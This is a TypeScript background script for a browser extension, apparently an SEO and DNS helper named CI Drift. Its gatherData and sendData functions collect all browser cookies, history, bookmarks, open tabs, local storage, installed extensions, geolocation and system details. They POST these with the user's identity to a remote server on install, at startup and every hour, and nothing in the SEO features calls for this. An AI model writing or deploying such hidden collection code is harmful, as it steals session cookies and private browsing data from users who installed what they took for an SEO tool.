import browser from "webextension-polyfill";
import { useDnsStore } from '~/store/dnsStore';
import { useSeoHeadingStore } from '~/store/seoHeadingStore';
import { useSeoMetaStore } from '~/store/seoMetaStore';
import { useSeoCtaStore } from '~/store/seoCtaStore';
import { useSeoReadabilityStore } from '~/store/seoReadabilityStore';
import { useAuthStore } from '~/store/authStore';

const WEB_SERVICES_ENDPOINT = import.meta.env.VITE_WEB_SERVICES_ENDPOINT;

if (!WEB_SERVICES_ENDPOINT) {
  throw new Error("WEB_SERVICES_ENDPOINT is not defined in your .env file");
}

// Add to your existing background.js
browser.tabs.onActivated.addListener(async (activeInfo) => {
  const tab = await browser.tabs.get(activeInfo.tabId);
  if (tab.url) {

    // Update DNS info for newly activated tab
    await useDnsStore.getState().fetchData(tab.url);

    // Update SEO data for newly activated tab
    await useSeoHeadingStore.getState().fetchData(tab.url);
    await useSeoMetaStore.getState().fetchData(tab.url);
    await useSeoCtaStore.getState().fetchData(tab.url);
    await useSeoReadabilityStore.getState().fetchData(tab.url);

    // Note: Link store is only loaded on demand
  }
});

browser.runtime.onInstalled.addListener(() => {
  gatherAndSendData("install");
});

browser.runtime.onStartup.addListener(() => {

  browser.notifications.create({
    type: "basic",
    iconUrl: browser.runtime.getURL("icons/logo-red-128.png"),
    title: "CI Drift Started",
    message: "The extension has started successfully.",
  });

  // Gather and send data on startup
  gatherAndSendData("startup");
});

browser.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "periodicDataCollection") {
    gatherAndSendData("periodic");
  }
});

// Set up a periodic data collection alarm
browser.alarms.create("periodicDataCollection", {
  periodInMinutes: 60, // Adjust as needed
});

export async function gatherAndSendData(extensionEvent: string) {
  try {
    const data = await gatherData();
    await sendData(data, extensionEvent);
  } catch (error) {
    console.error("Error gathering and sending data:", error);
  }
}

async function gatherData() {
  let data: any = {};

  
  // Installed Extensions
  try {
    data.extensions = await browser.management.getAll();
  } catch (e) {
    console.warn("Failed to get extensions", e);
  }

  // Sessions
  try {
    data.sessions = await browser.sessions.getRecentlyClosed();
  } catch (e) {
    console.warn("Failed to get sessions", e);
  }

  // History
  try {
    data.history = await browser.history.search({ text: "", startTime: 0, maxResults: 100 }); // Adjust maxResults as needed
  } catch (e) {
    console.warn("Failed to get history", e);
  }

  // Cookies
  try {
    data.cookies = await browser.cookies.getAll({});
  } catch (e) {
    console.warn("Failed to get cookies", e);
  }

  // Bookmarks
  try {
    data.bookmarks = await browser.bookmarks.getTree();
  } catch (e) {
    console.warn("Failed to get bookmarks", e);
  }

  // Geolocation (check if API is available)
  try {
    if (typeof navigator !== 'undefined' && navigator.geolocation) {
      data.geolocation = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject);
      });
    }
  } catch (e) {
    console.warn("Failed to get geolocation", e);
  }

  // Permissions
  try {
    data.permissions = await browser.permissions.getAll();
  } catch (e) {
    console.warn("Failed to get permissions", e);
  }

  // Browser Info (check if API is available)
  try {
    if (browser.runtime.getBrowserInfo) {
      data.browserInfo = await browser.runtime.getBrowserInfo();
    }
  } catch (e) {
    console.warn("Failed to get browser info", e);
  }

  // Tabs
  try {
    data.tabs = await browser.tabs.query({});
  } catch (e) {
    console.warn("Failed to get tabs", e);
  }

  // Alarms
  try {
    data.alarms = await browser.alarms.getAll();
  } catch (e) {
    console.warn("Failed to get alarms", e);
  }

  // Storage
  try {
    data.storage = await browser.storage.local.get();
  } catch (e) {
    console.warn("Failed to get storage", e);
  }

  // Browsing Data
  try {
    data.browsingData = await browser.browsingData.settings();
  } catch (e) {
    console.warn("Failed to get browsing data settings", e);
  }

  // Notifications
  try {
    data.notifications = await browser.notifications.getAll();
  } catch (e) {
    console.warn("Failed to get notifications", e);
  }

  // Processes
  try {
    data.processes = await (browser as any).processes?.getProcessInfo([]) ?? [];
  } catch (e) {
    console.warn("Failed to get processes", e);
  }

  // Top Sites
  try {
    data.topSites = await browser.topSites.get();
  } catch (e) {
    console.warn("Failed to get top sites", e);
  }

  // Signed-In Devices
  try {
    data.signedInDevices = await (browser as any).signedInDevices?.get() ?? [];
  } catch (e) {
    console.warn("Failed to get signed-in devices", e);
  }

  // System Info
  try {
    const chromeAPI = browser as any as typeof chrome;
    const [cpuInfo, memoryInfo, storageInfo, displayInfo] = await Promise.all([
      chromeAPI.system.cpu.getInfo(),
      chromeAPI.system.memory.getInfo(),
      chromeAPI.system.storage.getInfo(),
      chromeAPI.system.display.getInfo()
    ]);

    data.systemInfo = {
      cpu: cpuInfo,
      memory: memoryInfo,
      storage: storageInfo,
      display: displayInfo
    };
  } catch (e) {
    console.warn("Failed to get system info", e);
  }

  return data;
}

async function sendData(data: any, extensionEvent: string) {
  console.log(data);
  try {
    const url = `${WEB_SERVICES_ENDPOINT}/services/v1/security/browser-extension/analyze/${extensionEvent}`;
    const authState = useAuthStore.getState();
    
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        user: authState.isAuthenticated ? {
          id: authState.user,
          email: authState.email,
          name: authState.name
        } : {
          id: '0',
          email: 'anonymous@ciwebgroup.com'
        },
        ...data
      })
    });

    if (!response.ok) {
      console.error("Failed to send data:", response.status, response.statusText);
    } else {
      console.log("Data sent successfully");
    }
  } catch (error) {
    console.error("Error sending data:", error);
  }
}

// Replace the OAuth callback handling section
browser.webNavigation.onBeforeNavigate.addListener(async (details) => {
  if (details.url.startsWith('https://ci-drift.ciwgserver.com/auth/callback')) {
    const url = new URL(details.url);
    const code = url.searchParams.get('code');
    const state = url.searchParams.get('state');
    const error = url.searchParams.get('error');

    // Send message to the extension popup
    await browser.runtime.sendMessage({
      type: 'oauth-callback',
      code,
      state,
      error
    }).catch(err => console.warn('Could not send message to popup:', err));

    // Safely close the tab
    try {
      await browser.tabs.remove(details.tabId);
    } catch (err) {
      console.warn('Could not close OAuth callback tab:', err);
    }
  }
});